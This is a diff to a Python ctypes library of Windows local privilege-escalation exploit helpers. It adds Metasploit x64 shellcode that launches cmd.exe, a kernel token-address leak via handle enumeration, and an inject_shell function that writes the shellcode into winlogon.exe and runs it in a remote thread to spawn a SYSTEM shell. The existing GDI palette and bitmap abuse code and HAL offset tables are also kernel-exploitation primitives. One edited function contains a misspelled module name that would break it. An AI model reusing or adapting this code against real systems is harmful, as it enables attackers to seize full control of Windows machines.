@@ -2,9 +2,42 @@ import sys
 import os
 import struct
 import platform
+import signal
+from subprocess import check_output
 from ctypes import *
-import sys, platform
 from ctypes.wintypes import *
+
+#########################################################################################
+#######################################Shellcodes########################################
+#########################################################################################
+
+
+# /*
+#  * windows/x64/exec - 275 bytes
+#  * http://www.metasploit.com
+#  * VERBOSE=false, PrependMigrate=false, EXITFUNC=thread,
+#  * CMD=cmd.exe
+#  */
+SHELLCODE_EXEC_CMD_X64 = (
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
+"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
+"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
+"\x2e\x65\x78\x65\x00")
 
 #########################################################################################
 ######################################Common structs#####################################
@@ -16,6 +49,9 @@ ULONG = c_uint32
 PULONG = POINTER(ULONG)
 NTSTATUS = DWORD
 HPALETTE = HANDLE
+QWORD = c_ulonglong
+CHAR = c_char
+
 
 #to be filled properly
 class PEB(Structure):
@@ -93,6 +129,56 @@ class LOGPALETTE(Structure):
 		("palPalEntry", POINTER(PALETTEENTRY))
 	]
 
+class LSA_UNICODE_STRING(Structure):
+	"""Represent the LSA_UNICODE_STRING on ntdll."""
+	_fields_ = [
+		("Length", USHORT),
+		("MaximumLength", USHORT),
+		("Buffer", LPWSTR)
+	]
+
+class PUBLIC_OBJECT_TYPE_INFORMATION(Structure):
+	_fields_ = [
+		("Name", LSA_UNICODE_STRING),
+		("Reserved", ULONG * 22)
+	]
+	
+class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
+	"""Represent the SYSTEM_HANDLE_TABLE_ENTRY_INFO on ntdll."""
+	_fields_ = [
+		("Object", PVOID),
+		("UniqueProcessId", PVOID),
+		("HandleValue", PVOID),
+		("GrantedAccess", ULONG),
+		("CreatorBackTraceIndex", USHORT),
+		("ObjectTypeIndex", USHORT),
+		("HandleAttributes", ULONG),
+		("Reserved", ULONG),
+	]
+ 
+class SYSTEM_HANDLE_INFORMATION_EX(Structure):
+	"""Represent the SYSTEM_HANDLE_INFORMATION on ntdll."""
+	_fields_ = [
+		("NumberOfHandles", PVOID),
+		("Reserved", PVOID),
+		("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
+	]
+
+class PROCESSENTRY32(Structure):
+	"""Describes an entry from a list of the processes residing in the system
+	   address space when a snapshot was taken."""
+	_fields_ = [ ( 'dwSize' , DWORD ) ,
+				 ( 'cntUsage' , DWORD) ,
+				 ( 'th32ProcessID' , DWORD) ,
+				 ( 'th32DefaultHeapID' , POINTER(ULONG)) ,
+				 ( 'th32ModuleID' , DWORD) ,
+				 ( 'cntThreads' , DWORD) ,
+				 ( 'th32ParentProcessID' , DWORD) ,
+				 ( 'pcPriClassBase' , LONG) ,
+				 ( 'dwFlags' , DWORD) ,
+				 ( 'szExeFile' , CHAR * MAX_PATH ) 
+	] 
+
 #########################################################################################
 ###################################Function definitions##################################
 #########################################################################################
@@ -103,6 +189,7 @@ ntdll = windll.ntdll
 gdi32 = windll.gdi32
 shell32 = windll.shell32
 user32 = windll.user32
+advapi32 = windll.advapi32
 
 gdi32.CreatePalette.argtypes = [LPVOID]
 gdi32.CreatePalette.restype = HPALETTE
@@ -113,9 +200,6 @@ gdi32.GetPaletteEntries.restype = UINT
 gdi32.SetPaletteEntries.argtypes = [HPALETTE, UINT, UINT, LPVOID]
 gdi32.SetPaletteEntries.restype = UINT
 
-ntdll.NtQueryInformationProcess.argtypes = [HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG]
-ntdll.NtQueryInformationProcess.restype = NTSTATUS
-
 gdi32.SetBitmapBits.argtypes = [HBITMAP, DWORD, LPVOID]
 gdi32.SetBitmapBits.restype = LONG
 
@@ -125,8 +209,40 @@ gdi32.GetBitmapBits.restype = LONG
 gdi32.CreateBitmap.argtypes = [c_int, c_int, UINT, UINT, c_void_p]
 gdi32.CreateBitmap.restype = HBITMAP
 
+ntdll.NtQueryInformationProcess.argtypes = [HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG]
+ntdll.NtQueryInformationProcess.restype = NTSTATUS
+
+ntdll.NtQueryObject.argtypes = [HANDLE, DWORD, POINTER(PUBLIC_OBJECT_TYPE_INFORMATION), ULONG, POINTER(ULONG)]
+ntdll.NtQueryObject.restype = NTSTATUS
+
+ntdll.NtQuerySystemInformation.argtypes = [DWORD, POINTER(SYSTEM_HANDLE_INFORMATION_EX), ULONG, POINTER(ULONG)]
+ntdll.NtQuerySystemInformation.restype = NTSTATUS
+
 kernel32.GetProcAddress.restype = c_ulonglong
 kernel32.GetProcAddress.argtypes = [HMODULE, LPCSTR]
+
+kernel32.OpenProcess.argtypes = [DWORD, BOOL, DWORD]
+kernel32.OpenProcess.restype = HANDLE
+
+kernel32.GetCurrentProcess.restype = HANDLE												
+
+kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCSTR, DWORD, POINTER(LPVOID)]
+kernel32.WriteProcessMemory.restype = BOOL						   
+
+kernel32.VirtualAllocEx.argtypes = [HANDLE, LPVOID, DWORD, DWORD, DWORD]
+kernel32.VirtualAllocEx.restype = LPVOID
+
+kernel32.CreateRemoteThread.argtypes = [HANDLE, QWORD, UINT, QWORD, LPVOID, DWORD, POINTER(HANDLE)]
+kernel32.CreateRemoteThread.restype = BOOL
+
+advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
+advapi32.OpenProcessToken.restype = BOOL
+
+kernel32.CreateToolhelp32Snapshot.argtypes = [DWORD, DWORD]
+kernel32.CreateToolhelp32Snapshot.restype = HANDLE
+
+kernel32.DeviceIoControl.argtypes = [HANDLE, DWORD, c_void_p, DWORD, c_void_p, DWORD, c_void_p, c_void_p]
+kernel32.DeviceIoControl.restype = BOOL
 
 #########################################################################################
 ######################################Common constants###################################
@@ -139,6 +255,11 @@ ProcessImageFileName = 27 # Retrieves a UNICODE_STRING value containing the name
 ProcessBreakOnTermination = 29 #Retrieves a ULONG value indicating whether the process is considered critical. Note  This value can be used starting in Windows XP with SP3. Starting in Windows 8.1, IsProcessCritical should be used instead.
 ProcessSubsystemInformation = 75#Retrieves a SUBSYSTEM_INFORMATION_TYPE value indicating the subsystem type of the process. The buffer pointed to by the ProcessInformation parameter should be large enough to hold a single SUBSYSTEM_INFORMATION_TYPE enumeration.
 
+ObjectBasicInformation = 0
+ObjectTypeInformation = 2
+
+SystemExtendedHandleInformation = 64
+
 VER_NT_WORKSTATION 			= 1 # The system is a workstation.
 VER_NT_DOMAIN_CONTROLLER	= 2	# The system is a domain controller.
 VER_NT_SERVER				= 3	# The system is a server, but not a domain controller.
@@ -150,7 +271,16 @@ OPEN_EXISTING = 0x3
 MEM_COMMIT = 0x00001000
 MEM_RESERVE = 0x00002000
 PAGE_EXECUTE_READWRITE = 0x00000040
+VIRTUAL_MEM  = ( 0x1000 | 0x2000 )
+
 STATUS_SUCCESS = 0
+STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
+STATUS_BUFFER_OVERFLOW = 0x80000005L
+STATUS_INVALID_HANDLE = 0xC0000008L
+STATUS_BUFFER_TOO_SMALL = 0xC0000023L 
+
+PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
+TOKEN_ALL_ACCESS = 0xf00ff
 
 FILE_DEVICE_UNKNOWN = 0x00000022
 
@@ -168,6 +298,106 @@ NULL = 0x0
 
 INVALID_HANDLE_VALUE = -1
 
+TH32CS_SNAPPROCESS = 0x02
+
+class x_file_handles(Exception):
+	pass
+
+#########################################################################################
+###################This section contains sysinfo related functions#######################
+#########################################################################################
+
+
+#source: https://github.com/tjguk/winsys/blob/master/random/file_handles.py
+def signed_to_unsigned(signed):
+	"""
+	Convert signed to unsigned
+	@param signed: the value to be converted
+	"""
+	unsigned = struct.unpack("L", struct.pack("l", signed))
+	return unsigned
+
+#source: https://github.com/tjguk/winsys/blob/master/random/file_handles.py + https://www.exploit-db.com/exploits/34272/
+def get_type_info(handle):
+	"""
+	Get the handle type information.
+	@param handle: handle of the object
+	"""
+	public_object_type_information = PUBLIC_OBJECT_TYPE_INFORMATION()
+	size = DWORD(sizeof(public_object_type_information))
+	while True:
+		result = ntdll.NtQueryObject(handle, ObjectTypeInformation, byref(public_object_type_information), size, None)
+		if result == STATUS_SUCCESS:
+			return public_object_type_information.Name.Buffer
+		elif result == STATUS_INFO_LENGTH_MISMATCH:
+			size = DWORD(size.value * 4)
+			resize(public_object_type_information, size.value)
+		elif result == STATUS_INVALID_HANDLE:
+			print "[-] INVALID HANDLE: %s, exiting..." % hex(handle)
+			sys.exit(-1)
+		else:
+			raise x_file_handles("NtQueryObject", hex(result))
+
+#source: https://github.com/tjguk/winsys/blob/master/random/file_handles.py + https://www.exploit-db.com/exploits/34272/
+def get_handles():
+	""" Return all the open handles in the system """
+	system_handle_information = SYSTEM_HANDLE_INFORMATION_EX()
+	size = DWORD (sizeof(system_handle_information))
+	while True:
+		result = ntdll.NtQuerySystemInformation(
+			SystemExtendedHandleInformation,
+			byref(system_handle_information),
+			size,
+			byref(size)
+		)
+		if result == STATUS_SUCCESS:
+			break
+		elif result == STATUS_INFO_LENGTH_MISMATCH:
+			size = DWORD(size.value * 4)
+			resize(system_handle_information, size.value)
+		else:
+			raise x_file_handles("NtQuerySystemInformation", hex(result))
+
+	pHandles = cast(
+		system_handle_information.Handles,
+		POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * \
+				system_handle_information.NumberOfHandles)
+	)
+	for handle in pHandles.contents:
+		yield handle.UniqueProcessId, handle.HandleValue, handle.Object
+
+def token_address_of_process(h_process, process_id):
+	token_handle = HANDLE()
+	if not advapi32.OpenProcessToken(h_process,TOKEN_ALL_ACCESS, byref(token_handle)):
+		print "[-] Could not open process token of process %s, exiting..." % pid
+		sys.exit()
+
+	print "[*] Leaking token addresses from kernel space..."
+	for pid, handle, obj in get_handles():
+		if pid == process_id and get_type_info(handle) == "Token":
+			if token_handle.value == handle:
+				print "[+] PID: %s token address: %x" % (str(process_id), obj)
+				return obj
+
+def getpid(procname):
+	""" Get Process Pid by procname """
+	pid = None
+	try:
+		hProcessSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+		pe32 = PROCESSENTRY32()
+		pe32.dwSize = sizeof(PROCESSENTRY32)
+		ret = kernel32.Process32First(hProcessSnap , byref(pe32))
+		while ret:
+			if pe32.szExeFile == LPSTR(procname).value:
+				pid = pe32.th32ProcessID
+			ret = kernel32.Process32Next(hProcessSnap, byref(pe32))
+		kernel32.CloseHandle ( hProcessSnap )
+	except Exception, e:
+		print "[-] Error: %s" % str(e)
+	if not pid:
+		print "[-] Could not find %s PID" % procname
+		sys.exit()
+	return pid
 #########################################################################################
 ###############This section contains kernel pool spraying related functions##############
 #########################################################################################
@@ -370,7 +600,7 @@ def calculate_bitmap_size_parameters(s):
 	@param s: size of the bitmap we need
 	@return: (width, height, cBitsPerPel) tuple
 	"""
-	p = platfrom.platform()
+	p = platform.platform()
 	if p == 'Windows-10-10.0.10586':
 		bmp_offset = 0x258
 		min_size = 0x370
@@ -758,16 +988,16 @@ def allocate_free_window(classNumber, pHMValidateHandle):
 
 	# Run HMValidateHandle on Window handle to get a copy of it in userland 
 	pWnd = HMValidateHandle(hWnd,1)
-    # Read pSelf from copied Window 
+	# Read pSelf from copied Window 
 	kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value
-    # Calculate ulClientDelta (tagWND.pSelf - HMValidateHandle()) 
-    # pSelf = ptr to object in Kernel Desktop Heap; pWnd = ptr to object in User Desktop Heap 
+	# Calculate ulClientDelta (tagWND.pSelf - HMValidateHandle()) 
+	# pSelf = ptr to object in Kernel Desktop Heap; pWnd = ptr to object in User Desktop Heap 
 	ulClientDelta = kernelpSelf - pWnd
-    # Read tagCLS from copied Window 
+	# Read tagCLS from copied Window 
 	kernelTagCLS = (cast(pWnd+pcls, POINTER(c_ulonglong))).contents.value
-    # Calculate user-land tagCLS location: tagCLS - ulClientDelta 
+	# Calculate user-land tagCLS location: tagCLS - ulClientDelta 
 	userTagCLS = kernelTagCLS - ulClientDelta
-    # Calculate kernel-land tagCLS.lpszMenuName 
+	# Calculate kernel-land tagCLS.lpszMenuName 
 	tagCLS_lpszMenuName = (cast (userTagCLS+lpszMenuNameOffset, POINTER(c_ulonglong))).contents.value
 		
 	# Destroy Window
@@ -831,7 +1061,10 @@ def gdi_abuse_tagwnd_technique_palette():
 	@return: pFirstColor address of the manager and worker palettes and the handles
 	"""
 	p = platform.platform()
-	if p == 'Windows-10-10.0.14393' or p == 'Windows-10-10.0.15063' or p == 'Windows-10-10.0.16299':
+	a = platform.architecture()[0]
+	if a == '32bit' and p == 'Windows-7-6.1.7601-SP1':
+		pFirstColor_offset = 0x4c
+	elif p == 'Windows-10-10.0.14393' or p == 'Windows-10-10.0.15063' or p == 'Windows-10-10.0.16299':
 		pFirstColor_offset = 0x78
 	elif p == 'Windows-10-10.0.10586' or p == 'Windows-8-6.2.9200-SP0' or p == 'Windows-8.1-6.3.9600' or p == 'Windows-7-6.1.7601-SP1':
 		pFirstColor_offset = 0x80
@@ -995,45 +1228,40 @@ def get_psinitialsystemprocess():
 	return PsInitialSystemProcess
 
 	
-def get_haldisp_ofsetsx86():
+def get_haldisp_offsets():
 	(halbase, dllname) = find_driver_base("hal.dll")
 	version = sys.getwindowsversion()
-
-	if((version.major == 5) and (version.minor == 1) and ('3' in version.service_pack)):
-		# the target machine's OS is Windows XP SP3
-		HaliQuerySystemInformation = halbase+0x16bba # Offset for XPSP3
-		HalpSetSystemInformation   = halbase+0x19436 # Offset for XPSP3
-	elif((version.major == 5) and (version.minor == 2) and ('2' in version.service_pack)):
-		# the target machine's OS is Windows Server 2003 SP2
-		HaliQuerySystemInformation = halbase+0x1fa1e # Offset for WIN2K3
-		HalpSetSystemInformation   = halbase+0x21c60 # Offset for WIN2K3
-	elif((version.major == 6) and (version.minor == 1) and ('1' in version.service_pack)):
-		# the target machine's OS is Windows 7x86 SP1
-		HaliQuerySystemInformation = halbase+0x278a2 # Offset for WIN7SP1x86
-		HalpSetSystemInformation   = halbase+0x281b4 # Offset for WIN7SP1x86
+	p = platfrom.platform()
+	a = platform.architecture()[0]
+	if a == '32bit':
+		if((version.major == 5) and (version.minor == 1) and ('3' in version.service_pack)):
+			# the target machine's OS is Windows XP SP3
+			HaliQuerySystemInformation = halbase+0x16bba # Offset for XPSP3
+			HalpSetSystemInformation   = halbase+0x19436 # Offset for XPSP3
+		elif((version.major == 5) and (version.minor == 2) and ('2' in version.service_pack)):
+			# the target machine's OS is Windows Server 2003 SP2
+			HaliQuerySystemInformation = halbase+0x1fa1e # Offset for WIN2K3
+			HalpSetSystemInformation   = halbase+0x21c60 # Offset for WIN2K3
+		elif((version.major == 6) and (version.minor == 1) and ('1' in version.service_pack)):
+			# the target machine's OS is Windows 7x86 SP1
+			HaliQuerySystemInformation = halbase+0x278a2 # Offset for WIN7SP1x86
+			HalpSetSystemInformation   = halbase+0x281b4 # Offset for WIN7SP1x86
+		else:
+			print "[-] No info about HaliQuerySystemInformation and HalpSetSystemInformation for this OS version"
+			print "[-] Exiting..."
+			sys.exit(-1)
 	else:
-		print "[-] No info about HaliQuerySystemInformation and HalpSetSystemInformation for this OS version"
-		print "[-] Exiting..."
-		sys.exit(-1)
+		if((version.major == 6) and (version.minor == 1) and ('1' in version.service_pack)):
+			# the target machine's OS is Windows 7x64 SP1
+			HaliQuerySystemInformation = halbase+0x398e8 # Offset for win7 x64
+			HalpSetSystemInformation = 0
+		else:
+			print "[-] No info about HaliQuerySystemInformation and HalpSetSystemInformation for this OS version"
+			print "[-] Exiting..."
+			sys.exit(-1)
 
 	print "[+] HaliQuerySystemInformation address: %s" % hex(HaliQuerySystemInformation)
 	print "[+] HalpSetSystemInformation address: %s" % hex(HalpSetSystemInformation)
-	return (HaliQuerySystemInformation,HalpSetSystemInformation)
-
-def get_haldisp_ofsetsx64():
-	(halbase, dllname) = find_driver_base("hal.dll")
-	version = sys.getwindowsversion()
-
-	if((version.major == 6) and (version.minor == 1) and ('1' in version.service_pack)):
-		# the target machine's OS is Windows 7x64 SP1
-		HaliQuerySystemInformation = halbase+0x398e8 # Offset for win7 x64
-	else:
-		print "[-] No info about HaliQuerySystemInformation and HalpSetSystemInformation for this OS version"
-		print "[-] Exiting..."
-		sys.exit(-1)
-		
-	print "[+] HaliQuerySystemInformation address: %s" % hex(HaliQuerySystemInformation)
-	print "[+] HalpSetSystemInformation address: %s" % hex(HalpSetSystemInformation) 
 	return (HaliQuerySystemInformation,HalpSetSystemInformation)
 
 def getosvariablesx86():
@@ -1275,3 +1503,53 @@ def getosvariablesx():
 	if platform.architecture()[0] == '64bit': return getosvariablesx64()
 	else: return getosvariablesx86()
 	
+def inject_shell():
+	"""Impersonate privileged token and inject shellcode into winlogon.exe"""
+
+	# Get winlogon.exe pid
+	pid = getpid("winlogon.exe")
+
+	# Get a handle to the winlogon process we are injecting into 
+	hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
+
+	if not hProcess:
+		print "[-] Couldn't acquire a handle to PID: %s" % pid
+		sys.exit(-1)
+
+	print "[+] Obtained handle 0x%x for the winlogon.exe process" % hProcess
+
+	# Creating shellcode buffer to inject into the host process
+	sh = create_string_buffer(SHELLCODE_EXEC_CMD_X64, len(SHELLCODE_EXEC_CMD_X64))
+	code_size = len(SHELLCODE_EXEC_CMD_X64)	
+
+	# Allocate some space for the shellcode (in the program memory)
+	sh_address = kernel32.VirtualAllocEx(hProcess, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+	if not sh_address:
+		print "[-] Could not allocate shellcode in the remote process"
+		getLastError()
+		sys.exit(-1)
+
+	print "[+] Allocated memory at address 0x%x" % sh_address
+
+	# Inject shellcode in to winlogon.exe process space
+	written = LPVOID(0)
+	shellcode = LPVOID(sh_address)
+	dwStatus = kernel32.WriteProcessMemory(hProcess, shellcode, sh, code_size, byref(written))
+	if not dwStatus:
+		print "[-] Could not write shellcode into winlogon.exe, exiting..."
+		getLastError()
+		sys.exit(-1)
+
+	print "[+] Injected %d bytes of shellcode to 0x%x" % (written.value, sh_address)
+
+	# Now we create the remote thread and point its entry routine to be head of 
+	# our shellcode
+	thread_id = HANDLE(0)
+	if not kernel32.CreateRemoteThread(hProcess, 0, 0, sh_address, 0, 0, byref(thread_id)):
+		print "[-] Failed to inject shellcode into winlogon.exe, exiting..."
+		sys.exit()
+
+	print "[+] Remote thread  0x%08x created" % thread_id.value
+	print "[+] Spawning SYSTEM shell..."
+	# Kill python process to kill the window and avoid BSODs
+	os.kill(os.getpid(), signal.SIGABRT)
